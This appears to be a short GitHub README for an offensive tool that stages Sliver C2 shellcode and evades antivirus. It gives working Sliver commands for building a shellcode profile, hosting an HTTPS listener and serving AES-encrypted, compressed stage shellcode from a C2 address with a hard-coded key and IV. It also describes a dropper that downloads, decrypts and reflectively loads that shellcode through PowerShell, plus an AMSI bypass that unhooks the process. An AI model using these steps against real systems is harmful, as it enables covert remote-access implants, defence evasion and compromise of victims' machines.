# Bypass AV with Sliver c2
Dropper + reflective load script for bypassing AV with sliver c2

Taken from [this article](https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8).

Compression is a huge IOC so I may change this to remove

## In Sliver

Create new profile

`profiles new -b  https://192.168.1.11:443 --skip-symbols --format shellcode --arch amd64 my_profile`

Host SSL cert (you can fake with msf impersonate_ssl)

`https -L 192.168.1.11 -l 443 -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key`

Stage profile shellcode

`stage-listener --url https://192.168.1.11:8080 --profile my_profile -c /home/ycf/blog/sliver/crt.crt -k /home/ycf/blog/sliver/key.key -C deflate9 --aes-encrypt-key D(G+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 8y/B?E(G+KbPeShV`

## Dropper

Shellcode dropper solution will download, decompress, decrypt shellcode and execute. Best way is to reflectively load via PowerShell as it is .NET assembly, and the dropper is not evasive at all (you need AMSI bypass).

1. Read in solution DLL assembly

`get-content -encoding byte -path .\sliverloader.dll | clip`

2. Convert your keys and IV to raw bytes.

3. Update loader script

4. Use CLR AMSI bypass for entire process unhook
